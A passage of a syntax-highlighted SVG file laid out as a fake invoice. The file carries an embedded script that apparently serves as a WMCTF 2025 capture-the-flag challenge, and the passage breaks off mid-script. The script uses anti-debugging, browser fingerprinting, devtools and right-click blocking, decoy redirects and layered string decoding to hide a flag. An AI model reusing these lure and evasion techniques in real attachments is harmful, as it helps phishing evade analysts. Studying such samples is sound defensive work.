</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;200&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>TechSolutions Corp<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;220&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>123 Business Ave<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;240&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>New York, NY 10001<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;180&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;16&#34;</span> <span class=na>font-weight=</span><span class=s>&#34;bold&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>To:<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;200&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>Your Company<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;220&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>456 Client Street<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;240&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>Boston, MA 02101<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Invoice details --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;line</span> <span class=na>x1=</span><span class=s>&#34;80&#34;</span> <span class=na>y1=</span><span class=s>&#34;280&#34;</span> <span class=na>x2=</span><span class=s>&#34;720&#34;</span> <span class=na>y2=</span><span class=s>&#34;280&#34;</span> <span class=na>stroke=</span><span class=s>&#34;#dee2e6&#34;</span> <span class=na>stroke-width=</span><span class=s>&#34;2&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;310&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>font-weight=</span><span class=s>&#34;bold&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>Description<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;500&#34;</span> <span class=na>y=</span><span class=s>&#34;310&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>font-weight=</span><span class=s>&#34;bold&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>Amount<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;340&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>IT Security Consultation<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;500&#34;</span> <span class=na>y=</span><span class=s>&#34;340&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>$2,500.00<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;80&#34;</span> <span class=na>y=</span><span class=s>&#34;370&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>Network Assessment<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;500&#34;</span> <span class=na>y=</span><span class=s>&#34;370&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;14&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>$1,800.00<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nt>&lt;line</span> <span class=na>x1=</span><span class=s>&#34;450&#34;</span> <span class=na>y1=</span><span class=s>&#34;400&#34;</span> <span class=na>x2=</span><span class=s>&#34;720&#34;</span> <span class=na>y2=</span><span class=s>&#34;400&#34;</span> <span class=na>stroke=</span><span class=s>&#34;#dee2e6&#34;</span> <span class=na>stroke-width=</span><span class=s>&#34;1&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;500&#34;</span> <span class=na>y=</span><span class=s>&#34;430&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;16&#34;</span> <span class=na>font-weight=</span><span class=s>&#34;bold&#34;</span> <span class=na>fill=</span><span class=s>&#34;#495057&#34;</span><span class=nt>&gt;</span>Total: $4,300.00<span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nt>&lt;text</span> <span class=na>x=</span><span class=s>&#34;400&#34;</span> <span class=na>y=</span><span class=s>&#34;480&#34;</span> <span class=na>text-anchor=</span><span class=s>&#34;middle&#34;</span> <span class=na>font-family=</span><span class=s>&#34;Arial&#34;</span> <span class=na>font-size=</span><span class=s>&#34;12&#34;</span> <span class=na>fill=</span><span class=s>&#34;#dc3545&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    Please click to view detailed payment instructions
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/text&gt;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- Hidden malicious script with multiple layers of obfuscation --&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;script&gt;</span><span class=cp>&lt;![CDATA[
</span></span></span><span class=line><span class=cl><span class=cp>    // Anti-debugging and detection evasion
</span></span></span><span class=line><span class=cl><span class=cp>    var jXKuzdDMGk = false;
</span></span></span><span class=line><span class=cl><span class=cp>    var detectionBypass = true;
</span></span></span><span class=line><span class=cl><span class=cp>    var globalSeed = 0x5A4D;
</span></span></span><span class=line><span class=cl><span class=cp>    var entropy = [];
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Advanced fingerprinting and detection evasion
</span></span></span><span class=line><span class=cl><span class=cp>    (function antiDetection() {
</span></span></span><span class=line><span class=cl><span class=cp>      // Check for WebDriver, PhantomJS, Burp Suite
</span></span></span><span class=line><span class=cl><span class=cp>      if (navigator.webdriver || window.callPhantom || window._phantom || 
</span></span></span><span class=line><span class=cl><span class=cp>          navigator.userAgent.includes(&#34;Burp&#34;) || navigator.userAgent.includes(&#34;HeadlessChrome&#34;) ||
</span></span></span><span class=line><span class=cl><span class=cp>          navigator.userAgent.includes(&#34;Selenium&#34;) || window.chrome &amp;&amp; chrome.runtime &amp;&amp; chrome.runtime.onConnect) {
</span></span></span><span class=line><span class=cl><span class=cp>        window.location = &#34;about:blank&#34;;
</span></span></span><span class=line><span class=cl><span class=cp>        return;
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      // Advanced environment fingerprinting
</span></span></span><span class=line><span class=cl><span class=cp>      var canvas = document.createElement(&#39;canvas&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>      var ctx = canvas.getContext(&#39;2d&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>      ctx.textBaseline = &#39;top&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>      ctx.font = &#39;14px Arial&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>      ctx.fillText(&#39;Browser fingerprint test&#39;, 2, 2);
</span></span></span><span class=line><span class=cl><span class=cp>      var fingerprint = canvas.toDataURL();
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      // Generate entropy from browser characteristics
</span></span></span><span class=line><span class=cl><span class=cp>      entropy = [
</span></span></span><span class=line><span class=cl><span class=cp>        navigator.hardwareConcurrency || 4,
</span></span></span><span class=line><span class=cl><span class=cp>        screen.colorDepth,
</span></span></span><span class=line><span class=cl><span class=cp>        screen.pixelDepth,
</span></span></span><span class=line><span class=cl><span class=cp>        new Date().getTimezoneOffset(),
</span></span></span><span class=line><span class=cl><span class=cp>        fingerprint.length,
</span></span></span><span class=line><span class=cl><span class=cp>        navigator.language.length,
</span></span></span><span class=line><span class=cl><span class=cp>        window.devicePixelRatio * 1000 | 0
</span></span></span><span class=line><span class=cl><span class=cp>      ];
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      // Check for debugging environment indicators
</span></span></span><span class=line><span class=cl><span class=cp>      if (window.outerHeight - window.innerHeight &gt; 200 || 
</span></span></span><span class=line><span class=cl><span class=cp>          window.outerWidth - window.innerWidth &gt; 200 ||
</span></span></span><span class=line><span class=cl><span class=cp>          fingerprint.length &lt; 100) {
</span></span></span><span class=line><span class=cl><span class=cp>        detectionBypass = false;
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      // Generate seed from entropy
</span></span></span><span class=line><span class=cl><span class=cp>      globalSeed = entropy.reduce(function(acc, val) {
</span></span></span><span class=line><span class=cl><span class=cp>        return ((acc &lt;&lt; 5) - acc + val) &amp; 0xFFFFFFFF;
</span></span></span><span class=line><span class=cl><span class=cp>      }, 0x5A4D);
</span></span></span><span class=line><span class=cl><span class=cp>    })();
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Block developer tools shortcuts
</span></span></span><span class=line><span class=cl><span class=cp>    document.addEventListener(&#34;keydown&#34;, function (event) {
</span></span></span><span class=line><span class=cl><span class=cp>      var blockedKeys = [
</span></span></span><span class=line><span class=cl><span class=cp>        { keyCode: 123 }, // F12
</span></span></span><span class=line><span class=cl><span class=cp>        { ctrl: true, keyCode: 85 }, // Ctrl + U
</span></span></span><span class=line><span class=cl><span class=cp>        { ctrl: true, shift: true, keyCode: 73 }, // Ctrl + Shift + I
</span></span></span><span class=line><span class=cl><span class=cp>        { ctrl: true, shift: true, keyCode: 67 }, // Ctrl + Shift + C
</span></span></span><span class=line><span class=cl><span class=cp>        { ctrl: true, shift: true, keyCode: 74 }, // Ctrl + Shift + J
</span></span></span><span class=line><span class=cl><span class=cp>        { ctrl: true, shift: true, keyCode: 75 }, // Ctrl + Shift + K
</span></span></span><span class=line><span class=cl><span class=cp>        { meta: true, alt: true, keyCode: 73 }, // Cmd + Alt + I (Mac)
</span></span></span><span class=line><span class=cl><span class=cp>        { meta: true, keyCode: 85 } // Cmd + U (Mac)
</span></span></span><span class=line><span class=cl><span class=cp>      ];
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      var isBlocked = blockedKeys.some(function(key) {
</span></span></span><span class=line><span class=cl><span class=cp>        return (!key.ctrl || event.ctrlKey) &amp;&amp;
</span></span></span><span class=line><span class=cl><span class=cp>               (!key.shift || event.shiftKey) &amp;&amp;
</span></span></span><span class=line><span class=cl><span class=cp>               (!key.meta || event.metaKey) &amp;&amp;
</span></span></span><span class=line><span class=cl><span class=cp>               (!key.alt || event.altKey) &amp;&amp;
</span></span></span><span class=line><span class=cl><span class=cp>               event.keyCode === key.keyCode;
</span></span></span><span class=line><span class=cl><span class=cp>      });
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      if (isBlocked) {
</span></span></span><span class=line><span class=cl><span class=cp>        event.preventDefault();
</span></span></span><span class=line><span class=cl><span class=cp>        return false;
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>    });
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Block right-click context menu
</span></span></span><span class=line><span class=cl><span class=cp>    document.addEventListener(&#39;contextmenu&#39;, function(event) {
</span></span></span><span class=line><span class=cl><span class=cp>      event.preventDefault();
</span></span></span><span class=line><span class=cl><span class=cp>      return false;
</span></span></span><span class=line><span class=cl><span class=cp>    });
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Advanced anti-debugging using performance timing with variable thresholds
</span></span></span><span class=line><span class=cl><span class=cp>    (function timingCheck() {
</span></span></span><span class=line><span class=cl><span class=cp>      var baseThreshold = 50;
</span></span></span><span class=line><span class=cl><span class=cp>      var dynamicThreshold = baseThreshold + (globalSeed % 100);
</span></span></span><span class=line><span class=cl><span class=cp>      var checkCount = 0;
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      setInterval(function() {
</span></span></span><span class=line><span class=cl><span class=cp>        var start = performance.now();
</span></span></span><span class=line><span class=cl><span class=cp>        debugger;
</span></span></span><span class=line><span class=cl><span class=cp>        var end = performance.now();
</span></span></span><span class=line><span class=cl><span class=cp>        checkCount++;
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>        // Variable threshold based on environment
</span></span></span><span class=line><span class=cl><span class=cp>        var currentThreshold = dynamicThreshold + (checkCount * 10);
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>        if (end - start &gt; currentThreshold &amp;&amp; detectionBypass) {
</span></span></span><span class=line><span class=cl><span class=cp>          jXKuzdDMGk = true;
</span></span></span><span class=line><span class=cl><span class=cp>          // Redirect with multiple decoy destinations
</span></span></span><span class=line><span class=cl><span class=cp>          var decoyUrls = [&#39;https://www.google.com&#39;, &#39;https://www.microsoft.com&#39;, &#39;about:blank&#39;];
</span></span></span><span class=line><span class=cl><span class=cp>          window.location.replace(decoyUrls[globalSeed % decoyUrls.length]);
</span></span></span><span class=line><span class=cl><span class=cp>        }
</span></span></span><span class=line><span class=cl><span class=cp>      }, 150 + (globalSeed % 100));
</span></span></span><span class=line><span class=cl><span class=cp>    })();
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    function customPRNG(seed) {
</span></span></span><span class=line><span class=cl><span class=cp>      var m = 0x80000000; // 2**31
</span></span></span><span class=line><span class=cl><span class=cp>      var a = 1103515245;
</span></span></span><span class=line><span class=cl><span class=cp>      var c = 12345;
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      seed = (a * seed + c) % m;
</span></span></span><span class=line><span class=cl><span class=cp>      return seed / (m - 1);
</span></span></span><span class=line><span class=cl><span class=cp>    }
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    function advancedXOR(data, keyBase) {
</span></span></span><span class=line><span class=cl><span class=cp>      var result = &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>      var expandedKey = &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>      for (var i = 0; i &lt; data.length; i++) {
</span></span></span><span class=line><span class=cl><span class=cp>        var keyChar = keyBase.charCodeAt(i % keyBase.length);
</span></span></span><span class=line><span class=cl><span class=cp>        var entropyVal = entropy[i % entropy.length];
</span></span></span><span class=line><span class=cl><span class=cp>        var rotatedKey = ((keyChar ^ entropyVal) + globalSeed) % 256;
</span></span></span><span class=line><span class=cl><span class=cp>        expandedKey += String.fromCharCode(rotatedKey);
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      for (var j = 0; j &lt; data.length; j++) {
</span></span></span><span class=line><span class=cl><span class=cp>        result += String.fromCharCode(data.charCodeAt(j) ^ expandedKey.charCodeAt(j));
</span></span></span><span class=line><span class=cl><span class=cp>      }
</span></span></span><span class=line><span class=cl><span class=cp>      
</span></span></span><span class=line><span class=cl><span class=cp>      return result;
</span></span></span><span class=line><span class=cl><span class=cp>    }
</span></span></span><span class=line><span class=cl><span class=cp>    
</span></span></span><span class=line><span class=cl><span class=cp>    // Main payload - heavily obfuscated with multiple transformation layers
</span></span></span><span class=line><span class=cl><span class=cp>    setTimeout(function() {
</span></span></span><span class=line><span class=cl><span class=cp>      if (!jXKuzdDMGk &amp;&amp; detectionBypass) {
</span></span></span><span class=line><span class=cl><span class=cp>        var decoyArray1 = [119,109,99,116,102,123,102,97,107,101,95,102,108,97,103,125]; // wmctf{fake_flag}
</span></span></span><span class=line><span class=cl><span class=cp>        var decoyArray2 = [104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,99,111,109];
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>        var polymorphicData = [
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;V01DVEZbZmFrZV9mbGFnXQ==&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;bm90X3RoZV9yZWFsX2ZsYWc=&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;ZGVjb3lfZGF0YQ==&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>          &#39;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#39;
</span></span></span><span class=line><span class=cl><span class=cp>        ];
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>        // Layer 3: Environmental validation with complex checks
</span></span></span><span class=line><span class=cl><span class=cp>        var envValidation = function() {
</span></span></span><span class=line><span class=cl><span class=cp>          var checks = [
</span></span></span><span class=line><span class=cl><span class=cp>            typeof window !== &#39;undefined&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>            typeof document !== &#39;undefined&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>            navigator.userAgent.length &gt; 10,
</span></span></span><span class=line><span class=cl><span class=cp>            screen.width &gt; 0 &amp;&amp; screen.height &gt; 0,
</span></span></span><span class=line><span class=cl><span class=cp>            Date.now() &gt; 1700000000000, // After 2023
</span></span></span><span class=line><span class=cl><span class=cp>            Math.abs(new Date().getTimezoneOffset()) &lt; 1440, // Valid timezone
</span></span></span><span class=line><span class=cl><span class=cp>            entropy.length === 7,
</span></span></span><span class=line><span class=cl><span class=cp>            globalSeed !== 0x5A4D // Should be modified by fingerprinting
</span></span></span><span class=line><span class=cl><span class=cp>          ];
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>          var validCount = checks.filter(Boolean).length;
</span></span></span><span class=line><span class=cl><span class=cp>          return validCount &gt;= 6; // Require most checks to pass
</span></span></span><span class=line><span class=cl><span class=cp>        };
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>        // Layer 4: Steganographic data hidden in mathematical sequences
</span></span></span><span class=line><span class=cl><span class=cp>        var fibSequence = [1,1,2,3,5,8,13,21,34,55,89,144,233,377,610,987,1597,2584];
</span></span></span><span class=line><span class=cl><span class=cp>        var primeSequence = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61];
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>        // Hidden data in sequence differences (steganography)
</span></span></span><span class=line><span class=cl><span class=cp>        var hiddenIndices = [];
</span></span></span><span class=line><span class=cl><span class=cp>        for (var i = 1; i &lt; fibSequence.length; i++) {
</span></span></span><span class=line><span class=cl><span class=cp>          var diff = fibSequence[i] - fibSequence[i-1];
</span></span></span><span class=line><span class=cl><span class=cp>          if (diff &gt; 0 &amp;&amp; diff &lt; polymorphicData.length) {
</span></span></span><span class=line><span class=cl><span class=cp>            hiddenIndices.push(diff % polymorphicData.length);
</span></span></span><span class=line><span class=cl><span class=cp>          }
</span></span></span><span class=line><span class=cl><span class=cp>        }
</span></span></span><span class=line><span class=cl><span class=cp>        
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>        var generateDynamicKey = function() {
</span></span></span><span class=line><span class=cl><span class=cp>          var timeComponent = (Date.now() % 86400000).toString(36); // Daily changing component
</span></span></span><span class=line><span class=cl><span class=cp>          var envComponent = (globalSeed ^ 0xDEADBEEF).toString(36);
</span></span></span><span class=line><span class=cl><span class=cp>          var browserComponent = (navigator.userAgent.length * screen.colorDepth).toString(36);
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>          var staticKey = &#39;WMCTF_2025_SVG_ANALYSIS&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>          return staticKey;
</span></span></span><span class=line><span class=cl><span class=cp>        };
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>        var decryptionPipeline = function() {
</span></span></span><span class=line><span class=cl><span class=cp>          if (!envValidation()) {
</span></span></span><span class=line><span class=cl><span class=cp>            console.log(&#39;Environment validation failed&#39;);
</span></span></span><span class=line><span class=cl><span class=cp>            return null;
</span></span></span><span class=line><span class=cl><span class=cp>          }
</span></span></span><span class=line><span class=cl><span class=cp>          
</span></span></span><span class=line><span class=cl><span class=cp>          try {
</span></span></span><span class=line><span class=cl><span class=cp>            var dynamicKey = generateDynamicKey();
</span></span></span><span class=line><span class=cl><span class=cp>            var realDataIndices = [3, 4, 5, 6, 7]; // Skip decoy data
</span></span></span><span class=line><span class=cl><span class=cp>            var encryptedParts = [];
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>            for (var i = 0; i &lt; realDataIndices.length; i++) {
</span></span></span><span class=line><span class=cl><span class=cp>              var idx = realDataIndices[i];
</span></span></span><span class=line><span class=cl><span class=cp>              if (idx &lt; polymorphicData.length) {
</span></span></span><span class=line><span class=cl><span class=cp>                encryptedParts.push(polymorphicData[idx]);
</span></span></span><span class=line><span class=cl><span class=cp>              }
</span></span></span><span class=line><span class=cl><span class=cp>            }
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>            console.log(&#39;Found encrypted parts:&#39;, encryptedParts.length);
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>            var stage1Results = [];
</span></span></span><span class=line><span class=cl><span class=cp>            for (var j = 0; j &lt; encryptedParts.length; j++) {
</span></span></span><span class=line><span class=cl><span class=cp>              var part = encryptedParts[j];
</span></span></span><span class=line><span class=cl><span class=cp>              
</span></span></span><span class=line><span class=cl><span class=cp>              // Convert Unicode escape sequences to characters
</span></span></span><span class=line><span class=cl><span class=cp>              var decoded = part.replace(/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g, function(match) {
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>                var charMap = {
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2V&#39;: &#39;A&#39;, &#39;4p2P&#39;: &#39;D&#39;, &#39;4p2F&#39;: &#39;E&#39;, &#39;4p2g&#39;: &#39;G&#39;, &#39;4p2a&#39;: &#39;P&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2c&#39;: &#39;S&#39;, &#39;4oyI&#39;: &#39;V&#39;, &#39;4p2T&#39;: &#39;a&#39;, &#39;77iP&#39;: &#39;c&#39;, &#39;4p2S&#39;: &#39;c&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2L&#39;: &#39;c&#39;, &#39;4p2D&#39;: &#39;a&#39;, &#39;4p2O&#39;: &#39;e&#39;, &#39;4p2M&#39;: &#39;e&#39;, &#39;4p2d&#39;: &#39;f&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;77iO&#39;: &#39;g&#39;, &#39;4p2b&#39;: &#39;h&#39;, &#39;4p2Z&#39;: &#39;h&#39;, &#39;4oyL&#39;: &#39;i&#39;, &#39;77iM&#39;: &#39;i&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2J&#39;: &#39;i&#39;, &#39;4p2B&#39;: &#39;i&#39;, &#39;4p2R&#39;: &#39;k&#39;, &#39;4p2h&#39;: &#39;m&#39;, &#39;4p2X&#39;: &#39;n&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2H&#39;: &#39;n&#39;, &#39;4pyx&#39;: &#39;n&#39;, &#39;4p2I&#39;: &#39;o&#39;, &#39;4p2A&#39;: &#39;o&#39;, &#39;4p2C&#39;: &#39;s&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2Y&#39;: &#39;s&#39;, &#39;4p2j&#39;: &#39;t&#39;, &#39;77iK&#39;: &#39;t&#39;, &#39;4p2U&#39;: &#39;t&#39;, &#39;4p2K&#39;: &#39;t&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4p2N&#39;: &#39;t&#39;, &#39;4p2E&#39;: &#39;v&#39;, &#39;4oyM&#39;: &#39;w&#39;, &#39;77iL&#39;: &#39;{&#39;, &#39;4py9&#39;: &#39;}&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;77iN&#39;: &#39;_&#39;, &#39;4p2W&#39;: &#39;_&#39;, &#39;4p2Q&#39;: &#39;_&#39;, &#39;4p2G&#39;: &#39;_&#39;, &#39;4py8&#39;: &#39;!&#39;,
</span></span></span><span class=line><span class=cl><span class=cp>                  &#39;4py7&#39;: &#39;!&#39;, &#39;4py6&#39;: &#39;!&#39;, &#39;4py5&#39;: &#39;!&#39;, &#39;4py4&#39;: &#39;!&#39;
</span></span></span><span class=line><span class=cl><span class=cp>                };
</span></span></span><span class=line><span class=cl><span class=cp>                return charMap[match] || &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=cp>              });
</span></span></span><span class=line><span class=cl><span class=cp>              
</span></span></span><span class=line><span class=cl><span class=cp>              stage1Results.push(decoded);
</span></span></span><span class=line><span class=cl><span class=cp>            }
</span></span></span><span class=line><span class=cl><span class=cp>            
</span></span></span><span class=line><span class=cl><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>            var combined = stage1Results.join(&#39;&#39;);
